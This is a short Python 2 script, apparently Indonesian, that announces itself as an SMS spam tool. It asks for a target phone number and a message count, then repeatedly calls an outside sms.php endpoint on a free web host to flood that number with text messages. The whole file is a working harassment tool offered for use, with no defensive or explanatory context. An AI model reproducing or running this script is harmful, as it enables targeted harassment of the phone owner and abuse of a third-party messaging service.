#!/usr/bin/python2
#coding:utf-8
import logging,requests,itertools
log = logging.getLogger("[SazXt]");log.setLevel(logging.INFO);ch = logging.StreamHandler();ch.setLevel(logging.INFO);fot = logging.Formatter('\r\033[32m%(levelname)s:\033[37m%(name)s: %(message)s');ch.setFormatter(fot);log.addHandler(ch)
pk= 0
def ha():
	try:
		global pk
		af = lambda x:[i for i in itertools.chain(range(1,x+1),range(x-1,0,-1))]
		u = "\n".join(["%s%s"%(' '*(5-i),''.join([str(j) for j in af(i)])) for i in af(5)])
		print u+"\n Spamz Sms By Sazxt"
		_intp_ = raw_input("[+] No Target : ")
		_cout_ = int(raw_input("[+] Jumlah : "))
		while pk < _cout_:
			pk += 1
			_send = requests.get('https://sinafipika.000webhostapp.com/sms.php/sms.php?nomor=' + str(_intp_) + '&paket=' + str(pk))
			log.info("[!] Progeess [ %s ]"%(_send))
	except:
		log.warning("[!] Close Progress !")
ha()
		